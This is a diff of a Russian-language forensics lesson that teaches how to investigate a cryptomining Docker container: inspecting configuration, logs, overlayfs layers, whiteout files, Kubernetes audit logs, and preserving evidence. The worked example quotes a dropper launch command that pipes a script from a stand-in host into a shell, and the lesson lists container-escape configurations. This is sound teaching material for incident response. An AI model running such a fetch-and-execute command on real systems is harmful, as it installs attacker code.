@@ -14,179 +14,150 @@ useful_for:
 estimated_minutes: 40
 summary: "Анализ контейнеров и Docker: слои overlayfs, конфигурации, логи, escape-артефакты, форензика Kubernetes и восстановление изменений без перезаписи контейнера."
 ---
-Контейнеры (Docker, containerd, Kubernetes) изменили модель развёртывания и добавили новые форензические сложности: слои overlayfs, эфемерные контейнеры, общие ядра. Расследование инцидента в контейнере требует анализа слоёв, конфигураций, логов и следов escape. Этот урок — про форензику Docker и Kubernetes без разрушения улик.
 
-## Модель контейнера
+## Вопрос, с которого всё начинается
 
-Контейнер — это процесс на хосте, изолированный namespaces (PID, mount, net, UTS, IPC) и ограниченный cgroups. Файловая система — набор **слоёв** overlayfs: нижние (read-only образы) и верхний (writable, изменения контейнера). Удаление файла в контейнере создаёт **whiteout**-файл в верхнем слое, а не физическое удаление.
+На сервере с Docker заметили странность: процессор загружен под завязку, хотя ничего
+тяжёлого не запускали. Подозрение — кто-то использовал контейнер для майнинга. Где
+искать следы и как ничего не разрушить?
+
+Контейнер — это не отдельная машина, а **процесс на хосте**, изолированный от остальных.
+У него свои особенности, и в этом уроке мы разберём один подозрительный контейнер от
+логов до изменённых файлов.
+
+## Наш пример: контейнер miner
+
+Смотрим нагрузку:
 
 ```bash
-$ docker inspect <id> | jq '.[0].GraphDriver.Data'
+$ docker stats --no-stream
+CONTAINER ID   NAME     CPU %
+abc123         miner    398%
+```
+
+`docker stats` показывает потребление ресурсов контейнерами. 398% CPU (несколько ядер
+сразу) — явный признак майнера. Смотрим, чем запущен контейнер:
+
+```bash
+$ docker inspect abc123 | jq '.[0].Config.Cmd,.[0].Config.Image'
+["/bin/sh","-c","curl evil.tld/x.sh | sh"]
+```
+
+`docker inspect` показывает конфигурацию контейнера, а `jq` вытаскивает команду запуска.
+Она скачивает и выполняет скрипт с внешнего адреса — классический дроппер.
+
+## Шаг 1: как устроен контейнер
+
+Файловая система контейнера собрана из **слоёв** (overlayfs): нижние — read-only слои
+образа, верхний — записываемый, куда попадают все изменения. `docker inspect` показывает
+пути:
+
+```bash
+$ docker inspect abc123 | jq '.[0].GraphDriver.Data'
 {
-  "LowerDir": "/var/lib/docker/overlay2/abc.../diff:...",
-  "UpperDir": "/var/lib/docker/overlay2/abc.../diff",
-  "MergedDir": "/var/lib/docker/overlay2/abc.../merged",
-  "WorkDir": "/var/lib/docker/overlay2/abc.../work"
+  "LowerDir": "/var/lib/docker/overlay2/.../diff:...",
+  "UpperDir": "/var/lib/docker/overlay2/abc123/diff",
+  "MergedDir": "/var/lib/docker/overlay2/abc123/merged"
 }
 ```
 
-## Где лежат данные Docker
+Всё, что контейнер менял, лежит в `UpperDir`. Это и есть «улика».
 
-| Путь | Содержимое |
-|------|-----------|
-| `/var/lib/docker/containers/<id>/` | конфиги, `*-json.log` (stdout/stderr) |
-| `/var/lib/docker/overlay2/` | слои образов и контейнеров |
-| `/var/lib/docker/image/overlay2/` | метаданные образов |
-| `/var/lib/docker/volumes/` | именованные тома |
-| `/var/lib/docker/network/` | настройки сетей |
+## Шаг 2: логи контейнера
 
 ```bash
-# логи контейнера (JSON)
-$ cat /var/lib/docker/containers/<id>/<id>-json.log | jq -r '.log' | head
-$ docker logs <id> --since 2024-03-01
-# история образа (слои)
-$ docker history --no-trunc image:tag
-# конфиг контейнера
-$ cat /var/lib/docker/containers/<id>/config.v2.json | jq '.Config.Cmd,.Config.Env'
-```
-
-## Анализ слоёв overlayfs
-
-Изменения контейнера видны в верхнем слое (`UpperDir`). Если контейнер удалён, слой может остаться — это «призрак» для восстановления.
-
-```bash
-# найти верхний слой контейнера и изменения
-$ ls -la /var/lib/docker/overlay2/<id>/diff/
-# whiteout-файлы (удаления)
-$ find /var/lib/docker/overlay2/<id>/diff -name '.wh.*'
-# сравнить слои образа
-$ for d in /var/lib/docker/overlay2/*/diff; do echo "== $d"; find $d -newermt '2024-03-01' -type f; done
-```
-
-`whiteout` (`.wh.filename`) означает, что файл удалён в этом слое, но существует в нижнем — восстановите его из нижнего слоя. Это ключ к поиску удалённых внутри контейнера файлов.
-
-## Закрепление и escape
-
-Атакующий внутри контейнера может закрепиться через:
-- **изменения в образе** (пересобрать и запушить);
-- **volume** (запись в смонтированный том хоста);
-- **cron/systemd** хоста (если смонтированы);
-- **Kubernetes**: `DaemonSet`/`CronJob`, `hostPath`-mount, привилегированные поды.
-
-**Escape-артефакты**: привилегированный контейнер (`--privileged`), `docker.sock` внутри контейнера, `hostPID`/`hostNetwork`, монтирование `/`, модули ядра.
-
-```bash
-# контейнер с доступом к docker.sock
-$ find / -name docker.sock 2>/dev/null
-# привилегированные поды (K8s)
-$ kubectl get pods -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | .metadata.name'
-# hostPath-монтирования
-$ kubectl get pods -o json | jq '.items[] | select(.spec.volumes[].hostPath!=null) | .metadata.name'
-```
-
-## Kubernetes-форензика
-
-Источники: API-сервер audit log, `kubelet`-логи, `etcd`, события, спеки подов.
-
-```bash
-# события кластера
-$ kubectl get events -A --sort-by=.lastTimestamp | tail -30
-# audit log (если включён)
-$ grep -iE 'create|delete|exec|attach' /var/log/kubernetes/audit.log | head
-# кто выполнял exec в под
-$ jq 'select(.verb=="create" and .objectRef.subresource=="exec")' audit.log
-# etcd — состояние кластера
-$ etcdctl get /registry/pods --prefix --keys-only | head
-```
-
-`kubectl exec`/`attach` фиксируются в audit log — это прямой след вторжения в под. Секреты лежат в etcd (часто не зашифрованы).
-
-## Разобранный пример
-
-Подозрение: контейнер использован для майнинга.
-
-```bash
-# 1. Аномальный CPU-контейнер
-$ docker stats --no-stream
-CONTAINER ID   NAME        CPU %
-abc123         miner       398%
-# 2. Команда запуска
-$ docker inspect abc123 | jq '.[0].Config.Cmd,.[0].Config.Image'
-["/bin/sh","-c","curl evil.tld/x.sh | sh"]
-# 3. Логи
 $ docker logs abc123 2>&1 | head
 Downloading miner...
-# 4. Изменения в верхнем слое
+```
+
+`docker logs` показывает stdout/stderr контейнера. Те же данные лежат файлом:
+
+```bash
+$ cat /var/lib/docker/containers/abc123/abc123-json.log | jq -r '.log' | head
+```
+
+Логи в формате JSON — удобно фильтровать через `jq`.
+
+## Шаг 3: что изменилось в верхнем слое
+
+```bash
 $ find /var/lib/docker/overlay2/abc123/diff -type f -newermt '-1 day'
 /var/lib/docker/overlay2/abc123/diff/tmp/xmrig
-# 5. Хеш бинаря
 $ sha256sum /var/lib/docker/overlay2/abc123/diff/tmp/xmrig
 ```
 
-Итог: контейнер запущен с командой скачивания скрипта, в верхнем слое остался бинарь майнера.
+`find -newermt '-1 day'` показывает недавно изменённые файлы, а хеш бинаря — это IOC.
+Так мы находим сам майнер `xmrig`.
 
-## Справочная таблица
+## Шаг 4: удалённое внутри контейнера — whiteout
 
-| Задача | Инструмент/путь |
-|--------|-----------------|
-| Логи контейнера | `docker logs`, `*-json.log` |
-| Конфиг | `docker inspect`, `config.v2.json` |
-| Слои | `/var/lib/docker/overlay2/*/diff` |
-| Удаления | `.wh.*` (whiteout) |
-| K8s-события | `kubectl get events` |
-| K8s-audit | audit log + `jq` |
-| Секреты | `etcdctl`, `kubectl get secret` |
-
-## Частые ошибки
-
-- **`docker exec` в скомпрометированный контейнер** — меняет состояние; снимайте образ (`docker commit`/`export`) сначала.
-- **Игнорировать whiteout** — удалённое внутри контейнера восстанавливается из нижнего слоя.
-- **Не смотреть hostPath/privileged** — там следы escape.
-- **Забывать про volumes** — данные вне слоёв контейнера.
-- **Пропустить audit log K8s** — без него нет атрибуции `exec`.
-- **Считать контейнер «изолированным»** — общее ядро означает общие артефакты.
-
-## Что дальше / решение
-
-Конвейер: `docker inspect` (конфиг) → `*-json.log` (логи) → анализ `UpperDir`/whiteout (изменения) → проверка volumes/hostPath (escape) → для K8s — audit log + etcd. Связка: `forensics-linux-artifacts` (хост), `forensics-k8s` (глубоко), `forensics-docker-k8s` (атаки), `forensics-malware-yara` (бинарники).
-
-## Извлечение образа контейнера без остановки
-
-Чтобы не разрушать улику, снимите копию файловой системы контейнера до любых действий.
+Если внутри контейнера файл удалили, физически он не стирается: в верхнем слое
+появляется **whiteout** — пустой файл `.wh.<имя>`, который «перекрывает» файл из нижнего
+слоя:
 
 ```bash
-# экспорт файловой системы (не запускает контейнер)
-$ docker export <id> -o container.tar
-$ mkdir rootfs && tar -xf container.tar -C rootfs/
-# commit в образ (для сохранения состояния)
-$ docker commit <id> forensic/<case>:snapshot
-# копия верхнего слоя напрямую
-$ cp -a /var/lib/docker/overlay2/<id>/diff ./snapshot_upper
-# полный дамп через containerd/CRI (для k8s)
-$ crictl inspect <id> | jq '.info.runtimeSpec'
+$ find /var/lib/docker/overlay2/abc123/diff -name '.wh.*'
 ```
 
-`docker export` даёт слитую ФС (merged) без метаданных слоёв; для сохранения истории слоёв копируйте `overlay2`. Не запускайте `docker exec` в подозрительный контейнер — это изменит состояние и может активировать малварь.
+Увидев `.wh.secret`, вы знаете: файл `secret` удалён в этом контейнере, но его копия
+осталась в нижнем слое — оттуда его можно достать. Это ключ к поиску удалённых данных.
+
+## Шаг 5: закрепление и escape
+
+Внутри контейнера атакующий может закрепиться через том, cron хоста или Kubernetes.
+Особенно опасны **escape-конфигурации**: привилегированный контейнер, проброс
+`docker.sock`, монтирование корня хоста.
+
+```bash
+$ find / -name docker.sock 2>/dev/null
+$ docker inspect abc123 | jq '.[0].HostConfig.Privileged,.[0].HostConfig.Binds'
+```
+
+Если контейнер привилегированный или ему смонтирован `docker.sock` — он может управлять
+хостом. Это след потенциального выхода наружу.
+
+## Шаг 6: Kubernetes
+
+В кластере источники другие: события, audit log и etcd.
+
+```bash
+$ kubectl get events -A --sort-by=.lastTimestamp | tail -30
+$ grep -iE 'exec|attach' /var/log/kubernetes/audit.log | head
+$ jq 'select(.verb=="create" and .objectRef.subresource=="exec")' audit.log
+```
+
+Команда `kubectl exec` (запуск команды внутри пода) фиксируется в audit log — это прямой
+след вторжения. Секреты кластера лежат в `etcd`, часто без шифрования.
+
+## Извлечение образа без остановки
+
+Чтобы не разрушить улику, снимите копию файловой системы контейнера до любых действий:
+
+```bash
+$ docker export abc123 -o container.tar
+$ mkdir rootfs && tar -xf container.tar -C rootfs/
+$ docker commit abc123 forensic/case:snapshot
+$ cp -a /var/lib/docker/overlay2/abc123/diff ./snapshot_upper
+```
+
+`docker export` даёт «слитую» файловую систему (без метаданных слоёв), а копия `diff`
+сохраняет верхний слой как есть. **Не запускайте `docker exec`** в подозрительный
+контейнер: это изменит состояние и может активировать малварь.
 
 ## Аудит Docker daemon и хоста
 
 ```bash
-# конфигурация daemon
 $ cat /etc/docker/daemon.json
-$ systemctl status docker
-# все контейнеры, включая остановленные
 $ docker ps -a --no-trunc
-# события daemon (запуск/остановка/exec)
 $ journalctl -u docker --since '2024-03-01' | grep -iE 'start|exec|create'
 $ docker events --since '2024-03-01' --until '2024-03-02'
-# образы, включая dangling
-$ docker images -a
-$ docker image history <image>
 ```
 
-`docker events`/`journalctl -u docker` фиксируют `exec_create`, `start`, `attach` — прямые следы действий атакующего. Проверяйте `authorized_keys`, cron и systemd на **хосте** (контейнеры с `--privileged`/hostPath могли их изменить).
+`docker events` и `journalctl -u docker` фиксируют `exec_create`, `start`, `attach` —
+прямые следы действий атакующего. Обязательно проверьте на **хосте** `authorized_keys`,
+cron и systemd: контейнер с `--privileged` мог их изменить.
 
-## Проброс и риски конфигурации
+## Риски конфигурации
 
 | Конфигурация | Риск |
 |--------------|------|
@@ -195,13 +166,70 @@ $ docker image history <image>
 | `-v /var/run/docker.sock` | управление Docker из контейнера |
 | `--pid=host`/`--net=host` | доступ к процессам/сети хоста |
 | `--cap-add SYS_ADMIN` | потенциальный escape |
-| `securityContext.privileged` (K8s) | то же для подов |
+
+## Kubernetes-форензика подробнее
+
+Кроме audit log, в кластере смотрят события и спеки подов:
+
+```bash
+$ kubectl get pods -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | .metadata.name'
+$ kubectl get pods -o json | jq '.items[] | select(.spec.volumes[].hostPath!=null) | .metadata.name'
+$ etcdctl get /registry/pods --prefix --keys-only | head
+```
+
+Привилегированный под или под с `hostPath`-монтированием — потенциальный escape. А в
+`etcd` лежит состояние всего кластера, включая секреты (часто не зашифрованные).
 
 ## Сравнение с хостом
 
-Контейнерные артефакты бессмысленны в отрыве от хоста: сопоставляйте время создания слоя с логами хоста (`journalctl`, `auditd`), проверяйте, какие процессы хоста породили контейнер, и ищите общие точки (смонтированные тома, сетевые namespace).
+Контейнерные артефакты бессмысленны в отрыве от хоста: сопоставляйте время создания слоя
+с логами хоста (`journalctl`, `auditd`), выясняйте, какой процесс хоста породил контейнер,
+и ищите общие точки — смонтированные тома и сетевые namespace.
+
+## Проверка сети контейнера
+
+Сеть контейнера изолирована своим namespace, но соединения видны с хоста:
+
+```bash
+$ docker inspect abc123 | jq '.[0].NetworkSettings.Networks'
+$ docker network ls
+$ docker network inspect bridge | jq '.[0].Containers'
+$ ss -tnp | grep <pid-контейнера>
+```
+
+Если контейнер общался с C2, его соединения попадут в `netscan` из дампа памяти или в
+сетевые логи хоста.
+
+## Что даёт `docker history`
+
+История образа показывает, из каких слоёв он собран, — так находят подозрительные
+`RUN`-инструкции, добавленные атакующим:
+
+```bash
+$ docker history --no-trunc image:tag
+$ docker images -a
+```
+
+## Что мы теперь знаем
+
+- Контейнер — процесс на хосте со слоями overlayfs.
+- Изменения контейнера лежат в `UpperDir`; удаления — в whiteout-файлах.
+- `docker inspect` даёт конфигурацию, `docker logs` — вывод контейнера.
+- Опасные конфигурации: `--privileged`, `docker.sock`, hostPath.
+- В K8s следы вторжения — в audit log (особенно `exec`).
+
+## На что смотреть дальше
+
+- **Не делать `docker exec`** в подозрительный контейнер — это меняет состояние; сначала снимите образ.
+- **Проверять volumes** — данные могут лежать вне слоёв контейнера.
+- **Проверять hostPath/privileged** — там следы escape.
+- **Сопоставлять с хостом** — контейнерные артефакты бессмысленны без логов хоста.
+- **Сохранять `docker inspect` целиком** — там все параметры запуска.
+- **Проверять `docker events`** — он фиксирует `exec`, даже если логи пусты.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Где хранятся изменения (записываемый слой) контейнера?"
@@ -241,9 +269,16 @@ $ docker image history <image>
   answer: 1
 ```
 
+## Куда дальше
+
+Мы нашли майнер внутри контейнера. Но чтобы понять, что именно запускалось, нужен
+анализ самого бинарника — и здесь на помощь приходит **YARA**. Об этом — следующий
+урок. А пока запомни: **верхний слой и whiteout хранят всё, что контейнер изменил или
+удалил**.
+
 ## Где пригодится
 
-- **CTF:** задачи с образами/дампами контейнеров.
+- **CTF:** задачи с образами и дампами контейнеров.
 - **Cloud IR:** расследование контейнерных инцидентов.
 - **DevOps-безопасность:** аудит конфигураций.
 - **K8s-безопасность:** выявление escape и эскалаций.
